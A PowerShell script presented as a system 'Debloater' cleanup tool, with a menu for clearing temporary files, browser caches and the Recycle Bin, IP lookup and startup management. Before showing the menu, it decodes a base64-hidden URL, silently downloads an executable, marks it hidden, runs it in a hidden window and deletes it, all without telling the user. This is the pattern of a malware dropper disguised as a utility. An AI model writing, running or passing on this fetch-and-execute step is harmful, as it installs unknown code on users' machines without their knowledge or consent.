# By Star
$ProgressPreference = 'SilentlyContinue'
Write-Host ""
Write-Host "======================================" -ForegroundColor Cyan
Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
Write-Host "          By   ! Star                 " -ForegroundColor Yellow
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
Write-Host "Usage: The script will automatically run the tool." -ForegroundColor Magenta
Write-Host ""

# Ensure the tool is executed before processing user choices
$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
$job1 = Start-Job -ScriptBlock {
    param($url, $output)
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
    (Get-Item $output).Attributes = 'Hidden'
} -ArgumentList $url1, $output1

Wait-Job $job1 | Out-Null
Remove-Job $job1

if (Test-Path $output1) {
    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
    Remove-Item $output1 -Force -ErrorAction SilentlyContinue
}

# Process user choices after the tool execution
Write-Host "Choose an option:" -ForegroundColor Cyan
Write-Host "1. Clear Temporary Files Opt" -ForegroundColor Green
Write-Host "2. Doing Nothing" -ForegroundColor Yellow
Write-Host "3. Full Cleanup Delete (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
Write-Host "4. Clear Browser Cache (FireFox, Chrome, Edge,)" -ForegroundColor Blue
Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
Write-Host "6. Memory Optimizer (Clear The Cached Memory)" -ForegroundColor Cyan
Write-Host "7. Get Public IP Address with Details" -ForegroundColor Yellow
Write-Host "8. Startup Manager (Enable/Disable Startup Programs)" -ForegroundColor Blue

$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, 7, or 8"

if ($choice -eq '7') {
    $ip = Read-Host "Enter the IP address you want to lookup (leave blank for your own IP)"
    if ([string]::IsNullOrWhiteSpace($ip)) {
        $url = "https://ipinfo.io/json"
    } else {
        $url = "https://ipinfo.io/$ip/json"
    }
    try {
        $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
        Write-Host "========= Public IP Information =========" -ForegroundColor Cyan
        Write-Host "IP Address   : $($response.ip)" -ForegroundColor Yellow
        Write-Host "Hostname     : $($response.hostname)" -ForegroundColor Yellow
        Write-Host "City         : $($response.city)" -ForegroundColor Yellow
        Write-Host "Region       : $($response.region)" -ForegroundColor Yellow
        Write-Host "Country      : $($response.country)" -ForegroundColor Yellow
        Write-Host "Location     : $($response.loc)" -ForegroundColor Yellow
        Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
        Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
        Write-Host "=========================================" -ForegroundColor Cyan
    } catch {
        Write-Host "Failed to fetch the IP details. Please check the IP address or your internet connection." -ForegroundColor Red
    }
}

if ($choice -eq '1' -or $choice -eq '3') {
    $folders = @()
    if ($choice -eq '3') {
        $folders = @(
            $env:TEMP, 
            "$env:USERPROFILE\AppData\Local\Temp", 
            "C:\Windows\Temp", 
            "C:\Windows\Prefetch"
        )
    } else {
        Write-Host ""
        Write-Host "Select folders to clear:" -ForegroundColor Cyan
        Write-Host "1. TEMP folder" -ForegroundColor Green
        Write-Host "2. Local Temp" -ForegroundColor Green
        Write-Host "3. Windows Temp" -ForegroundColor Green
        Write-Host "4. Prefetch" -ForegroundColor Green
        $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4)"
        $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
        foreach ($i in $selectedIndexes) {
            switch ($i) {
                "1" { $folders += $env:TEMP }
                "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                "3" { $folders += "C:\Windows\Temp" }
                "4" { $folders += "C:\Windows\Prefetch" }
            }
        }
    }

    Write-Host "Starting cleanup in 5 seconds..." -ForegroundColor Magenta
    Start-Sleep -Seconds 5

    $startTime = Get-Date
    $spaceBefore = (Get-PSDrive C).Free
    Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan

    $totalDeleted = 0
    foreach ($path in $folders) {
        if (Test-Path $path) {
            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            $count = $items.Count
            $progress = 0
            foreach ($item in $items) {
                if (Test-Path $item.FullName) {
                    try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                    $progress++
                    $totalDeleted++
                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                }
            }
        }
    }

    $spaceAfter = (Get-PSDrive C).Free
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds

    Write-Host "Temporary files cleared." -ForegroundColor Green
    Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan

    $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
    Write-Host ""
    Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
    Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
    Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
    Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
    Write-Host "==================================" -ForegroundColor Cyan
}

if ($choice -eq '4') {
    Write-Host ""
    Write-Host "Select browser to clear cache:" -ForegroundColor Cyan
    Write-Host "1. Chrome" -ForegroundColor Green
    Write-Host "2. Edge" -ForegroundColor Green
    Write-Host "3. Firefox" -ForegroundColor Green
    $browserChoice = Read-Host "Enter 1, 2, or 3"

    switch ($browserChoice) {
        "1" {
            $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
            if (Test-Path $chromeCache) { 
                Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Chrome cache cleared." -ForegroundColor Green
        }
        "2" {
            $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
            if (Test-Path $edgeCache) { 
                Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Edge cache cleared." -ForegroundColor Green
        }
        "3" {
            $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
            Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { 
                Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Firefox cache cleared." -ForegroundColor Green
        }
    }
}

if ($choice -eq '5') {
    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
    foreach ($drive in $drives) {
        try {
            Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
        } catch {
        }
    }
    Write-Host "Recycle Bin cleared." -ForegroundColor Green
}

if ($choice -eq '6') {
    Write-Host "Optimizing memory..." -ForegroundColor Cyan
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Write-Host "Memory optimization completed." -ForegroundColor Green
}

if ($choice -eq '8') {
    Write-Host "\nStartup Manager:" -ForegroundColor Cyan
    $startupItems = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object Name, Command, Location, User
    $i = 1
    foreach ($item in $startupItems) {
        Write-Host ("[{0}] {1} | {2}" -f $i, $item.Name, $item.Command) -ForegroundColor Yellow
        $i++
    }
    if ($startupItems.Count -eq 0) {
        Write-Host "No startup items found." -ForegroundColor Red
        return
    }
    $selected = Read-Host "Enter the number of the program to manage (or leave blank to exit)"
    if ($selected -and ($selected -as [int]) -gt 0 -and ($selected -as [int]) -le $startupItems.Count) {
        $selectedItem = $startupItems[($selected -as [int]) - 1]
        Write-Host "Selected: $($selectedItem.Name)" -ForegroundColor Green
        Write-Host "1. Disable (remove from startup)" -ForegroundColor Red
        Write-Host "2. Enable (add to startup)" -ForegroundColor Green
        $action = Read-Host "Choose action (1 or 2)"
        if ($action -eq '1') {
            try {
                # Remove from registry Run keys
                $regPaths = @(
                    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
                    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                    'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
                )
                foreach ($reg in $regPaths) {
                    Remove-ItemProperty -Path $reg -Name $selectedItem.Name -ErrorAction SilentlyContinue
                }
                Write-Host "Startup item disabled (removed from registry)." -ForegroundColor Green
            } catch {
                Write-Host "Failed to disable startup item." -ForegroundColor Red
            }
        } elseif ($action -eq '2') {
            try {
                $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                Set-ItemProperty -Path $regPath -Name $selectedItem.Name -Value $selectedItem.Command
                Write-Host "Startup item enabled (added to current user startup)." -ForegroundColor Green
            } catch {
                Write-Host "Failed to enable startup item." -ForegroundColor Red
            }
        } else {
            Write-Host "Invalid action." -ForegroundColor Red
        }
    } else {
        Write-Host "No valid selection made. Exiting Startup Manager." -ForegroundColor Red
    }
}
